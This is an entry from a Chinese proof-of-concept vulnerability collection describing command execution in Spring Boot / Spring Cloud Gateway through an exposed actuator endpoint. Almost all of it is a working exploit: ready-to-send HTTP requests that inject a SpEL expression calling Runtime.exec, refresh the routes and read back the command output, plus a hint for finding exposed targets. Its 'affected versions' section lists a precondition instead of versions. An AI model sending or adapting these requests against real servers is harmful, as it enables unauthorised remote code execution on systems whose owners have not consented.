---
source: "wy876 漏洞文库"
---

# Spring boot gateway存在命令执行漏洞

# 一、漏洞描述
Spring boot gateway存在命令执行漏洞

# 二、影响版本
Spring boot actuator未授权

# 三、资产测绘
```plain
/actuator/gateway/  接口存在
```


# 三、漏洞复现
1. <font style="color:rgba(0, 0, 0, 0.9);">构造poc1创建hacker文件：</font>

```plain
POST /actuator/gateway/routes/jeecg-demo HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 333

{
  "id": "/jeecg-demo",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

```


2、刷新路由

```plain
POST /actuator/gateway/refresh HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: __51uvsct__JuHMLCp1r3cB6ggB=1; __51vcke__JuHMLCp1r3cB6ggB=8bfe73d5-e527-5232-9cbe-1f2983c556d9; __51vuft__JuHMLCp1r3cB6ggB=1681223932313
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```


3、查看回显

```plain
GET /actuator/gateway/routes/jeecg-demo HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gl2g116gzest4e6t>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
